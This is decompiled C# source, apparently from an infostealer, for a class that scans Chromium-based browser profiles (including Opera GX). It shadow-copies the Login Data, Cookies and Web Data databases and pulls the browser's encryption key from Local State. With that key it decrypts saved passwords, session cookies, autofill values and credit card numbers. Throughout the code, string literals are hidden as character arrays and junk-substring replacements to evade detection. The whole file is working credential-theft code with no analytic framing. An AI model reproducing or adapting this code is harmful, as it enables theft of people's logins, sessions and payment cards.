using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;

// Token: 0x02000002 RID: 2
public static class C_h_r_o_m_e
{
	// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
	public static List<ScannedBrowser> Scan(IList<string> profiles)
	{
		List<ScannedBrowser> list = new List<ScannedBrowser>();
		try
		{
			foreach (string baseDirectory in from x in profiles
			select Environment.ExpandEnvironmentVariables(x))
			{
				foreach (string text in FileCopier.FindPaths(baseDirectory, 1, 1, new string[]
				{
					new string(new char[]
					{
						'L',
						'o',
						'g',
						'i',
						'n',
						' ',
						'D',
						'a',
						't',
						'a'
					}),
					new string(new char[]
					{
						'W',
						'e',
						'b',
						' ',
						'D',
						'a',
						't',
						'a'
					}),
					new string(new char[]
					{
						'C',
						'o',
						'o',
						'k',
						'i',
						'e',
						's'
					})
				}))
				{
					ScannedBrowser scannedBrowser = new ScannedBrowser();
					string dataFolder = string.Empty;
					string text2 = string.Empty;
					try
					{
						dataFolder = new FileInfo(text).Directory.FullName;
						if (dataFolder.Contains(new string(new char[]
						{
							'O',
							'p',
							'e',
							'r',
							'a',
							' ',
							'G',
							'X',
							' ',
							'S',
							't',
							'a',
							'b',
							'l',
							'e'
						})))
						{
							text2 = new string(new char[]
							{
								'O',
								'p',
								'e',
								'r',
								'a',
								' ',
								'G',
								'X'
							});
						}
						else
						{
							text2 = (text.Contains(Environment.ExpandEnvironmentVariables(new string(new char[]
							{
								'%',
								'U',
								'S',
								'E',
								'R',
								'P',
								'E',
								'n',
								'v',
								'i',
								'r',
								'o',
								'n',
								'm',
								'e',
								'n',
								't',
								'R',
								'O',
								'F',
								'I',
								'L',
								'E',
								'%',
								'\\',
								'A',
								'p',
								'p',
								'D',
								'E',
								'n',
								'v',
								'i',
								'r',
								'o',
								'n',
								'm',
								'e',
								'n',
								't',
								'a',
								't',
								'a',
								'\\',
								'R',
								'o',
								'a',
								'E',
								'n',
								'v',
								'i',
								'r',
								'o',
								'n',
								'm',
								'e',
								'n',
								't',
								'm',
								'i',
								'n',
								'g'
							}).Replace("Environment", string.Empty))) ? FileCopier.ChromeGetRoamingName(dataFolder) : FileCopier.ChromeGetLocalName(dataFolder));
						}
						if (!string.IsNullOrEmpty(text2))
						{
							text2 = text2[0].ToString().ToUpper() + text2.Remove(0, 1);
							string text3 = FileCopier.ChromeGetName(dataFolder);
							if (!string.IsNullOrEmpty(text3))
							{
								if (text2.Contains('\\'))
								{
									text2 = text2.Split(new char[]
									{
										'\\'
									}).Last<string>();
								}
								scannedBrowser.BrowserName = text2;
								scannedBrowser.BrowserProfile = text3;
								scannedBrowser.Logins = C_h_r_o_m_e.MakeTries<List<Account>>(() => C_h_r_o_m_e.ScanPasswords(dataFolder), (List<Account> x) => x.Count > 0);
								scannedBrowser.Cookies = C_h_r_o_m_e.MakeTries<List<ScannedCookie>>(() => C_h_r_o_m_e.ScanCook(dataFolder), (List<ScannedCookie> x) => x.Count > 0);
								scannedBrowser.Autofills = C_h_r_o_m_e.MakeTries<List<Autofill>>(() => C_h_r_o_m_e.ScanFills(dataFolder), (List<Autofill> x) => x.Count > 0);
								scannedBrowser.CC = C_h_r_o_m_e.MakeTries<List<CC>>(() => C_h_r_o_m_e.ScanCC(dataFolder), (List<CC> x) => x.Count > 0);
							}
						}
					}
					catch (Exception)
					{
					}
					if (!scannedBrowser.IsEmpty())
					{
						list.Add(scannedBrowser);
					}
				}
			}
		}
		catch
		{
		}
		return list;
	}

	// Token: 0x06000002 RID: 2 RVA: 0x000023E0 File Offset: 0x000005E0
	private static List<Account> ScanPasswords(string profilePath)
	{
		List<Account> list = new List<Account>();
		try
		{
			string text = Path.Combine(profilePath, new string(new char[]
			{
				'L',
				'o',
				'g',
				'i',
				'n',
				' ',
				'D',
				'a',
				't',
				'a'
			}));
			if (!File.Exists(text))
			{
				return list;
			}
			string chromeKey = C_h_r_o_m_e.ParseLocalStateKey(profilePath);
			using (FileCopier fileCopier = new FileCopier())
			{
				try
				{
					DataBaseConnection dataBaseConnection = new DataBaseConnection(fileCopier.CreateShadowCopy(text));
					dataBaseConnection.ReadTable(new string(new char[]
					{
						'l',
						'o',
						'g',
						'i',
						'n',
						's'
					}));
					for (int i = 0; i < dataBaseConnection.RowLength; i++)
					{
						Account account = new Account();
						try
						{
							account.URL = dataBaseConnection.ParseValue(i, 0).Trim();
							account.Username = dataBaseConnection.ParseValue(i, 3).Trim();
							account.Password = C_h_r_o_m_e.DecryptChromium(dataBaseConnection.ParseValue(i, 5), chromeKey);
						}
						catch (Exception)
						{
						}
						finally
						{
							account.URL = (string.IsNullOrWhiteSpace(account.URL) ? "UNKNOWN" : account.URL);
							account.Username = (string.IsNullOrWhiteSpace(account.Username) ? "UNKNOWN" : account.Username);
							account.Password = (string.IsNullOrWhiteSpace(account.Password) ? "UNKNOWN" : account.Password);
						}
						if (account.Password != "UNKNOWN")
						{
							list.Add(account);
						}
					}
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		return list;
	}

	// Token: 0x06000003 RID: 3 RVA: 0x000025E4 File Offset: 0x000007E4
	private static List<ScannedCookie> ScanCook(string profilePath)
	{
		List<ScannedCookie> list = new List<ScannedCookie>();
		try
		{
			string text = Path.Combine(profilePath, new string(new char[]
			{
				'C',
				'o',
				'o',
				'k',
				'i',
				'e',
				's'
			}));
			if (!File.Exists(text))
			{
				return list;
			}
			string chromeKey = C_h_r_o_m_e.ParseLocalStateKey(profilePath);
			using (FileCopier fileCopier = new FileCopier())
			{
				try
				{
					DataBaseConnection dataBaseConnection = new DataBaseConnection(fileCopier.CreateShadowCopy(text));
					dataBaseConnection.ReadTable(new string(new char[]
					{
						'c',
						'o',
						'o',
						'k',
						'i',
						'e',
						's'
					}));
					for (int i = 0; i < dataBaseConnection.RowLength; i++)
					{
						ScannedCookie scannedCookie = null;
						try
						{
							scannedCookie = new ScannedCookie
							{
								Host = dataBaseConnection.ParseValue(i, new string(new char[]
								{
									'h',
									'o',
									's',
									't',
									'_',
									'k',
									'e',
									'y'
								})).Trim(),
								Http = dataBaseConnection.ParseValue(i, new string(new char[]
								{
									'h',
									'o',
									's',
									't',
									'_',
									'k',
									'e',
									'y'
								})).Trim().StartsWith("."),
								Path = dataBaseConnection.ParseValue(i, new string(new char[]
								{
									'p',
									'a',
									't',
									'h'
								})).Trim(),
								Secure = dataBaseConnection.ParseValue(i, new string(new char[]
								{
									'i',
									's',
									'_',
									's',
									'e',
									'c',
									'u',
									'r',
									'e'
								})).Contains("1"),
								Expires = Convert.ToInt64(dataBaseConnection.ParseValue(i, new string(new char[]
								{
									'e',
									'x',
									'p',
									'i',
									'r',
									'e',
									's',
									'_',
									'u',
									't',
									'c'
								})).Trim()) / 1000000L - 11644473600L,
								Name = dataBaseConnection.ParseValue(i, new string(new char[]
								{
									'n',
									'a',
									'm',
									'e'
								})).Trim(),
								Value = C_h_r_o_m_e.DecryptChromium(dataBaseConnection.ParseValue(i, new string(new char[]
								{
									'e',
									'n',
									'c',
									'r',
									'y',
									'p',
									't',
									'e',
									'd',
									'_',
									'v',
									'a',
									'l',
									'u',
									'e'
								})), chromeKey)
							};
							if (scannedCookie.Expires < 0L)
							{
								scannedCookie.Expires = DateTime.Now.AddMonths(12).Ticks - 621355968000000000L;
							}
						}
						catch
						{
						}
						if (!string.IsNullOrWhiteSpace((scannedCookie != null) ? scannedCookie.Value : null))
						{
							list.Add(scannedCookie);
						}
					}
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		return list;
	}

	// Token: 0x06000004 RID: 4 RVA: 0x000028B4 File Offset: 0x00000AB4
	private static List<Autofill> ScanFills(string profilePath)
	{
		List<Autofill> list = new List<Autofill>();
		try
		{
			string text = Path.Combine(profilePath, new string(new char[]
			{
				'W',
				'e',
				'b',
				' ',
				'D',
				'a',
				't',
				'a'
			}));
			if (!File.Exists(text))
			{
				return list;
			}
			string chromeKey = C_h_r_o_m_e.ParseLocalStateKey(profilePath);
			using (FileCopier fileCopier = new FileCopier())
			{
				try
				{
					DataBaseConnection dataBaseConnection = new DataBaseConnection(fileCopier.CreateShadowCopy(text));
					dataBaseConnection.ReadTable(new string(new char[]
					{
						'a',
						'u',
						't',
						'o',
						'f',
						'i',
						'l',
						'l'
					}));
					for (int i = 0; i < dataBaseConnection.RowLength; i++)
					{
						Autofill autofill = null;
						try
						{
							string text2 = dataBaseConnection.ParseValue(i, new string(new char[]
							{
								'v',
								'a',
								'l',
								'u',
								'e'
							})).Trim();
							if (text2.StartsWith(new string(new char[]
							{
								'v',
								'1',
								'0'
							})) || text2.StartsWith(new string(new char[]
							{
								'v',
								'1',
								'1'
							})))
							{
								text2 = C_h_r_o_m_e.DecryptChromium(text2, chromeKey);
							}
							autofill = new Autofill
							{
								Name = dataBaseConnection.ParseValue(i, new string(new char[]
								{
									'n',
									'a',
									'm',
									'e'
								})).Trim(),
								Value = text2
							};
						}
						catch
						{
						}
						if (autofill != null)
						{
							list.Add(autofill);
						}
					}
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		return list;
	}

	// Token: 0x06000005 RID: 5 RVA: 0x00002A8C File Offset: 0x00000C8C
	private static List<CC> ScanCC(string profilePath)
	{
		List<CC> list = new List<CC>();
		try
		{
			string text = Path.Combine(profilePath, new string(new char[]
			{
				'W',
				'e',
				'b',
				' ',
				'D',
				'a',
				't',
				'a'
			}));
			if (!File.Exists(text))
			{
				return list;
			}
			string chromeKey = C_h_r_o_m_e.ParseLocalStateKey(profilePath);
			using (FileCopier fileCopier = new FileCopier())
			{
				try
				{
					DataBaseConnection dataBaseConnection = new DataBaseConnection(fileCopier.CreateShadowCopy(text));
					dataBaseConnection.ReadTable("cmyredmyit_cmyardmys".Replace("my", string.Empty));
					for (int i = 0; i < dataBaseConnection.RowLength; i++)
					{
						CC cc = null;
						try
						{
							string number = C_h_r_o_m_e.DecryptChromium(dataBaseConnection.ParseValue(i, new string(new char[]
							{
								'c',
								'a',
								'r',
								'd',
								'_',
								'n',
								'u',
								'm',
								'b',
								'e',
								'r',
								'_',
								'e',
								'n',
								'c',
								'r',
								'y',
								'p',
								't',
								'e',
								'd'
							})), chromeKey).Replace(" ", string.Empty);
							cc = new CC
							{
								HolderName = dataBaseConnection.ParseValue(i, new string(new char[]
								{
									'n',
									'a',
									'm',
									'e',
									'_',
									'o',
									'n',
									'_',
									'c',
									'a',
									'r',
									'd'
								})).Trim(),
								Month = Convert.ToInt32(dataBaseConnection.ParseValue(i, new string(new char[]
								{
									'e',
									'x',
									'p',
									'i',
									'r',
									'a',
									's',
									'2',
									'1',
									'a',
									't',
									'i',
									'o',
									'n',
									'_',
									'm',
									'o',
									'a',
									's',
									'2',
									'1',
									'n',
									't',
									'h'
								}).Replace("as21", string.Empty)).Trim()),
								Year = Convert.ToInt32(dataBaseConnection.ParseValue(i, new string(new char[]
								{
									'e',
									'x',
									'p',
									'i',
									'r',
									'a',
									'a',
									's',
									'2',
									'1',
									't',
									'i',
									'o',
									'n',
									'_',
									'y',
									'a',
									's',
									'2',
									'1',
									'e',
									'a',
									'r'
								}).Replace("as21", string.Empty)).Trim()),
								Number = number
							};
						}
						catch
						{
						}
						if (cc != null)
						{
							list.Add(cc);
						}
					}
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		return list;
	}

	// Token: 0x06000006 RID: 6 RVA: 0x00002CAC File Offset: 0x00000EAC
	private static string DecryptChromium(string chiperText, string chromeKey)
	{
		string result = string.Empty;
		try
		{
			if (chiperText[0] == 'v' && chiperText[1] == '1')
			{
				result = CryptoProvider.Decrypt(Convert.FromBase64String(chromeKey), chiperText);
			}
			else
			{
				result = CryptoHelper.DecryptBlob(chiperText, DataProtectionScope.CurrentUser, null).Trim();
			}
		}
		catch (Exception)
		{
		}
		return result;
	}

	// Token: 0x06000007 RID: 7 RVA: 0x00002D08 File Offset: 0x00000F08
	public static T MakeTries<T>(Func<T> func, Func<T, bool> success)
	{
		int num = 1;
		T t = func();
		while (!success(t))
		{
			t = func();
			num++;
			if (num > 2)
			{
				return t;
			}
		}
		return t;
	}

	// Token: 0x06000008 RID: 8 RVA: 0x00002D3C File Offset: 0x00000F3C
	private static string ParseLocalStateKey(string profilePath)
	{
		string result = string.Empty;
		string path = string.Empty;
		try
		{
			string[] array = profilePath.Split(new string[]
			{
				"\\"
			}, StringSplitOptions.RemoveEmptyEntries);
			array = array.Take(array.Length - 1).ToArray<string>();
			int num = 0;
			for (;;)
			{
				if (num == 0)
				{
					path = Path.Combine(string.Join("\\", array), "Local State");
					if (File.Exists(path))
					{
						goto IL_B2;
					}
					num++;
				}
				else if (num == 1)
				{
					path = Path.Combine(profilePath, "Local State");
					if (File.Exists(path))
					{
						goto IL_B2;
					}
					num++;
				}
				else if (num == 2)
				{
					path = Path.Combine(string.Join("\\", array), "LocalPrefs.json");
					if (File.Exists(path))
					{
						goto IL_B2;
					}
					num++;
				}
				else if (num == 3)
				{
					break;
				}
			}
			path = Path.Combine(profilePath, "LocalPrefs.json");
			IL_B2:
			if (File.Exists(path))
			{
				try
				{
					using (new FileCopier())
					{
						result = File.ReadAllText(path).FromJSON<LocalState>().os_crypt.encrypted_key;
					}
				}
				catch (Exception)
				{
				}
			}
		}
		catch
		{
		}
		return result;
	}
}
